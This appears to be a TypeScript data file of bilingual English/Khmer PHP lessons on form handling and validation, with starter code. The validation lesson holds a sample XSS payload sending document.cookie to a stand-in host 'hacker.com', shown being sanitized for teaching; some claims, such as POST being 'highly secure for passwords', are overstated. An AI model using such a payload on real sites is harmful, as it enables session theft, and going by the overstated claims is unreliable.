import { Lesson } from '../types';

export const phpLessonsPart4: Lesson[] = [
  {
    id: "php-form-handling",
    title: {
      en: "PHP Form Handling",
      km: "ការដោះស្រាយទម្រង់ Form Handling"
    },
    content: {
      en: `### Receiving Form Submissions
PHP makes it simple to collect and handle values submitted from HTML forms. When a user completes and submits a form, the data is packaged and sent to the server script defined in the form's \`action\` attribute.

### HTTP Methods: GET vs POST
- **GET Method:**
  - Appends parameters directly to the visible browser address bar (e.g., \`welcome.php?name=Dara\`).
  - Limits data size to approx. 2000 characters.
  - Highly insecure for sensitive inputs (passwords, banking).
  - Accessible via the \`$_GET\` superglobal.
- **POST Method:**
  - Embeds parameters invisibly in the HTTP request body.
  - No strict limit on the amount of data (ideal for files, text blocks).
  - Highly secure for passwords.
  - Accessible via the \`$_POST\` superglobal.

> **Pitfall:** Never use \`GET\` for forms that collect login credentials, as passwords will be recorded in browser histories and proxy logs!`,
      km: `### ការទទួលទិន្នន័យពី Form (Form Handling)
PHP ធ្វើឱ្យការប្រមូល និងដោះស្រាយតម្លៃដែលផ្ញើចេញពី HTML Forms មានភាពងាយស្រួលបំផុត។ នៅពេលអ្នកប្រើប្រាស់ចុចផ្ញើ (Submit) ទិន្នន័យនឹងត្រូវបានកញ្ចប់ផ្ញើទៅកាន់ម៉ាស៊ីនបម្រើដែលបានកំណត់ក្នុងលក្ខណៈ \`action\` របស់ Form។

### វិធីសាស្ត្រ HTTP៖ GET និង POST
- **វិធីសាស្ត្រ GET:**
  - បន្ថែមកន្ទុយតម្លៃទិន្នន័យនៅលើអាសយដ្ឋាន URL នៃកម្មវិធីរុករក (ឧទាហរណ៍៖ \`welcome.php?name=Dara\`)។
  - កំណត់ទំហំទិន្នន័យផ្ញើត្រឹមប្រហែល ២០០០ តួអក្សរប៉ុណ្ណោះ។
  - មិនមានសុវត្ថិភាពទាល់តែសោះសម្រាប់ទិន្នន័យសំខាន់ៗ (ពាក្យសម្ងាត់ លេខកាត)។
  - ហៅយកមកប្រើតាមរយៈអថេរសកលជាន់ខ្ពស់ \`$_GET\`។
- **វិធីសាស្ត្រ POST:**
  - បង្កប់ទិន្នន័យសម្ងាត់ក្នុងផ្នែករបស់ HTTP request body ដោយមិនបង្ហាញលើ URL ឡើយ។
  - មិនកំណត់ទំហំទិន្នន័យផ្ញើឡើយ (ល្អបំផុតសម្រាប់ឯកសារ ឬអត្ថបទវែងៗ)។
  - មានសុវត្ថិភាពខ្ពស់សម្រាប់ការផ្ញើពាក្យសម្ងាត់។
  - ហៅយកមកប្រើតាមរយៈអថេរសកលជាន់ខ្ពស់ \`$_POST\`។

> **ប្រុងប្រយ័ត្ន:** មិនត្រូវប្រើ \`GET\` ដាច់ខាតសម្រាប់ទម្រង់បញ្ចូលពាក្យសម្ងាត់ ព្រោះវានឹងបង្ហាញអក្សរពាក្យសម្ងាត់ចំៗនៅលើ URL ដែលអាចឱ្យអ្នកដទៃលួចមើលបាន!`
    },
    starterCode: `<?php
// Let's simulate receiving form fields via POST
$_POST['username'] = "dara_sok";
$_POST['course'] = "PHP Backend Development";

// Standard Form Handling verification
if ($_SERVER["REQUEST_METHOD"] === "POST" || isset($_POST['username'])) {
    // Sanitize with htmlspecialchars to prevent XSS
    $username = htmlspecialchars($_POST['username']);
    $course = htmlspecialchars($_POST['course']);

    echo "=== Form Submission Processed ===\\n";
    echo "Welcome user: " . $username . "\\n";
    echo "You enrolled in course: " . $course . "\\n";
} else {
    echo "No form data submitted yet.\\n";
}
?>`
  },
  {
    id: "php-form-validation",
    title: {
      en: "PHP Form Validation",
      km: "ការផ្ទៀងផ្ទាត់ទម្រង់ Form Validation"
    },
    content: {
      en: `### Preventing Security Exploits (XSS)
Form validation is critical to protect your website from hacker exploits. A common vulnerability is **Cross-Site Scripting (XSS)**, where hackers inject malicious \`<script>\` tags to execute actions on users' browsers.

### Validation Strategies:
1. **\`trim()\`**: Removes extra spaces, tabs, and newlines from the start and end of inputs.
2. **\`stripslashes()\`**: Removes backslashes (\`\\\`) from the input.
3. **\`htmlspecialchars()\`**: Converts special characters like \`<\` and \`>\` to HTML entities (e.g., \`&lt;\`, \`&gt;\`), disabling execution in the browser.

> **Tip:** Write a reusable sanitization function and pass every user input through it before checking and saving values.`,
      km: `### ការពារការវាយប្រហារបច្ចេកវិទ្យា (XSS Vulnerability)
ការផ្ទៀងផ្ទាត់ទម្រង់ (Form Validation) គឺសំខាន់បំផុតដើម្បីការពារគេហទំព័ររបស់អ្នកពីការជ្រៀតចូលរបស់ហេគឃ័រ។ ភាពទន់ខ្សោយទូទៅមួយគឺ **Cross-Site Scripting (XSS)** ដែលហេគឃ័របង្កប់កូដបំផ្លាញ \`<script>\` ឱ្យរត់លើ browser របស់អ្នកដទៃ។

### យុទ្ធសាស្ត្រសម្អាតទិន្នន័យ៖
១. **\`trim()\`**: លុបចន្លោះទទេ (Spaces) និងការចុះបន្ទាត់ពីមុខ និងពីក្រោយអត្ថបទ។
២. **\`stripslashes()\`**: លុបសញ្ញាខណ្ឌបញ្ឆិត (\`\\\`) ចេញពីអត្ថបទ។
៣. **\`htmlspecialchars()\`**: បំប្លែងនិមិត្តសញ្ញាពិសេសដូចជា \`<\` និង \`>\` ទៅជាទម្រង់អត្ថបទ HTML Entities (ដូចជា \`&lt;\`, \`&gt;\`) ដើម្បីកុំឱ្យកូដរបស់ហេគឃ័រដំណើរការបាន។

> **គន្លឹះ:** បង្កើតមុខងារសម្អាតទិន្នន័យរួមមួយ រួចបញ្ជូនរាល់ទិន្នន័យទាំងអស់ដែលបានពីអ្នកប្រើប្រាស់កាត់តាមវាជានិច្ច មុនពេលពិនិត្យ ឬរក្សាទុក។`
    },
    starterCode: `<?php
// Simulated malicious input from hacker
$hackerInput = "  <script>location.href='http://hacker.com?steal=' + document.cookie;</script>  ";

function sanitizeInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

$securedOutput = sanitizeInput($hackerInput);

echo "=== RAW MALICIOUS INPUT ===\\n";
echo $hackerInput . "\\n\\n";

echo "=== SECURED SANITIZED OUTPUT ===\\n";
echo $securedOutput . "\\n";
?>`
  },
  {
    id: "php-form-required",
    title: {
      en: "PHP Form Required",
      km: "ទិន្នន័យទម្រង់ចាំបាច់ Form Required"
    },
    content: {
      en: `### Mandating Fields
Required fields must be checked prior to processing database operations to prevent database errors and logic crashes.

### Verification Algorithm:
- Use the built-in \`empty()\` function to check if a field contains no inputs.
- If \`empty()\` is true, trigger an error message and cancel database processing.
- Otherwise, sanitize and store.

\`\`\`php
if (empty($_POST["name"])) {
    $nameErr = "Name is required";
} else {
    $name = test_input($_POST["name"]);
}
\`\`\``,
      km: `### ការកំណត់ទិន្នន័យចាំបាច់ (Required Fields)
លក្ខខណ្ឌច្បាប់តម្រូវឱ្យអ្នកពិនិត្យមើលរាល់ប្រឡោះទិន្នន័យចាំបាច់ (Required) ជាមុនសិន មុនពេលរក្សាទុកទៅក្នុង Database ដើម្បីជៀសវាងកំហុស និងការគាំងប្រព័ន្ធ។

### ក្បួនដោះស្រាយ៖
- ប្រើប្រាស់មុខងារស្រាប់ \`empty()\` ដើម្បីពិនិត្យមើលថាតើប្រឡោះនោះគ្មានទិន្នន័យបញ្ចូលមែនឬទេ។
- បើ \`empty()\` ស្មើពិត (true) យើងបង្កើតអត្ថបទប្រាប់ពីកំហុស (Error Message)។
- បើមានទិន្នន័យ ត្រូវយកទៅសម្អាត និងរក្សាទុកធម្មតា។

\`\`\`php
if (empty($_POST["name"])) {
    $nameErr = "Name is required";
} else {
    $name = test_input($_POST["name"]);
}
\`\`\``
    },
    starterCode: `<?php
// Simulate post parameters where 'name' is empty and 'email' is provided
$_POST['name'] = ""; // Left empty
$_POST['email'] = "borey@example.com";

$nameErr = $emailErr = "";
$name = $email = "";

if ($_SERVER["REQUEST_METHOD"] === "POST" || isset($_POST['email'])) {
    // 1. Validate Name
    if (empty($_POST["name"])) {
        $nameErr = "Error: Name is required!";
    } else {
        $name = htmlspecialchars($_POST["name"]);
    }

    // 2. Validate Email
    if (empty($_POST["email"])) {
        $emailErr = "Error: Email is required!";
    } else {
        $email = htmlspecialchars($_POST["email"]);
    }
}

// Check output results
echo "=== Validation Results ===\\n";
if ($nameErr) {
    echo $nameErr . "\\n";
} else {
    echo "Name successfully received: " . $name . "\\n";
}

if ($emailErr) {
    echo $emailErr . "\\n";
} else {
    echo "Email successfully received: " . $email . "\\n";
}
?>`
  },
  {
    id: "php-form-url-email",
    title: {
      en: "PHP Form URL/E-mail",
      km: "ផ្ទៀងផ្ទាត់ URL/E-mail"
    },
    content: {
      en: `### Validating Data Formats
Once you confirm a field is not empty, you must verify if its format is correct using filters and regular expressions.

### Key Validation Methods:
1. **Email Verification:**
   - Use \`filter_var($email, FILTER_VALIDATE_EMAIL)\`.
   - Returns boolean validation state.
2. **URL / Website Verification:**
   - Use \`filter_var($url, FILTER_VALIDATE_URL)\`.
   - Or write a regular expression matching scheme, e.g., \`/\\b(?:https?|ftp):\\/\\/\\S+/i\`.`,
      km: `### ការផ្ទៀងផ្ទាត់ទម្រង់អ៊ីមែល និងតំណភ្ជាប់ (URL/E-mail)
បន្ទាប់ពីអ្នកប្រាកដថាទិន្នន័យមិនស្ទួនទទេហើយ អ្នកត្រូវបន្តត្រួតពិនិត្យទម្រង់សរសេរឱ្យបានត្រឹមត្រូវដោយប្រើតម្រង Filters និងកន្សោម RegEx។

### វិធីសាស្ត្រសំខាន់ៗ៖
១. **ការផ្ទៀងផ្ទាត់អ៊ីមែល (Email):**
   - ប្រើប្រាស់មុខងារ \`filter_var($email, FILTER_VALIDATE_EMAIL)\`។
   - វានឹងផ្តល់តម្លៃពិត (true) បើសរសេរត្រូវ និងមិនពិត (false) បើសរសេរខុស។
២. **ការផ្ទៀងផ្ទាត់តំណភ្ជាប់ (URL/Website):**
   - ប្រើប្រាស់មុខងារ \`filter_var($url, FILTER_VALIDATE_URL)\`។
   - ឬសរសេរ RegEx ដើម្បីត្រួតពិនិត្យដូចជា \`/\\b(?:https?|ftp):\\/\\/\\S+/i\`។`
    },
    starterCode: `<?php
$testEmail1 = "dara@example.com";
$testEmail2 = "invalid-email-address";

$testUrl1 = "https://www.cambodia.gov.kh";
$testUrl2 = "www.missing-protocol.com";

// Validate Emails
echo "Is '$testEmail1' valid? " . (filter_var($testEmail1, FILTER_VALIDATE_EMAIL) ? "Yes" : "No") . "\\n";
echo "Is '$testEmail2' valid? " . (filter_var($testEmail2, FILTER_VALIDATE_EMAIL) ? "Yes" : "No") . "\\n";

// Validate URLs
echo "Is '$testUrl1' valid? " . (filter_var($testUrl1, FILTER_VALIDATE_URL) ? "Yes" : "No") . "\\n";
echo "Is '$testUrl2' valid? " . (filter_var($testUrl2, FILTER_VALIDATE_URL) ? "Yes" : "No") . "\\n";
?>`
  },
  {
    id: "php-form-complete",
    title: {
      en: "PHP Form Complete",
      km: "ទម្រង់ពេញលេញ Form Complete"
    },
    content: {
      en: `### The Complete Validation Engine
By combining required validations, formatting checks, and security sanitization functions, we can construct a robust, production-ready form submission engine.

### Safe Script Processing Steps:
1. Strip all trailing whitespace with \`trim()\`.
2. Convert special HTML characters to prevent script injections.
3. Check required inputs for empty values.
4. Validate the format of email, phone, and website fields.
5. Process only when no errors are stored in the error stack!`,
      km: `### ម៉ាស៊ីនផ្ទៀងផ្ទាត់ទម្រង់ពេញលេញ (Form Complete)
ដោយការបូករួមបញ្ចូលគ្នានូវលក្ខខណ្ឌចាំបាច់ (Required), ការផ្ទៀងផ្ទាត់ទម្រង់សរសេរ និងការសម្អាតសុវត្ថិភាពទិន្នន័យ យើងអាចបង្កើតប្រព័ន្ធបញ្ជូនទិន្នន័យ Form ដ៏មានសុវត្ថិភាព និងរឹងមាំសម្រាប់គេហទំព័រពិតប្រាកដ។

### ជំហានដំណើរការប្រព័ន្ធសុវត្ថិភាព៖
១. លុបចន្លោះទទេដែលមិនចង់បានដោយប្រើ \`trim()\`។
២. បំប្លែងតួអក្សរពិសេស HTML ការពារការលួចបង្កប់កូដ។
៣. ពិនិត្យប្រឡោះទិន្នន័យចាំបាច់ទាំងអស់។
៤. ផ្ទៀងផ្ទាត់ទម្រង់អ៊ីមែល លេខទូរស័ព្ទ និងតំណភ្ជាប់។
៥. អនុញ្ញាតឱ្យរក្សាទុកលុះត្រាតែគ្មានកំហុសទាល់តែសោះនៅក្នុងអារេកំហុស (Error array)!`
    },
    starterCode: `<?php
// Simulated input package from user submission
$formData = [
    "fullname" => "  Sokha Heng ",
    "email" => "sokha@gmail.com",
    "website" => "https://sokha-blog.com",
    "comment" => "I love learning backend development in PHP!   ",
    "gender" => "Female"
];

$errors = [];
$cleanData = [];

// Validation Process
foreach ($formData as $field => $value) {
    // Sanitize first
    $value = trim($value);
    $value = stripslashes($value);
    $value = htmlspecialchars($value);

    // Form logic checks
    if ($field === "fullname") {
        if (empty($value)) {
            $errors["fullname"] = "Full name is required.";
        } else {
            $cleanData["fullname"] = $value;
        }
    }

    if ($field === "email") {
        if (empty($value)) {
            $errors["email"] = "Email is required.";
        } elseif (!filter_var($value, FILTER_VALIDATE_EMAIL)) {
            $errors["email"] = "Invalid email format.";
        } else {
            $cleanData["email"] = $value;
        }
    }

    if ($field === "website") {
        if (!empty($value) && !filter_var($value, FILTER_VALIDATE_URL)) {
            $errors["website"] = "Invalid website URL format.";
        } else {
            $cleanData["website"] = $value;
        }
    }

    if ($field === "comment" || $field === "gender") {
        $cleanData[$field] = $value;
    }
}

// Evaluate results
if (count($errors) > 0) {
    echo "=== Form rejected with errors ===\\n";
    print_r($errors);
} else {
    echo "=== Form approved! Secured clean data ===\\n";
    print_r($cleanData);
}
?>`
  }
];
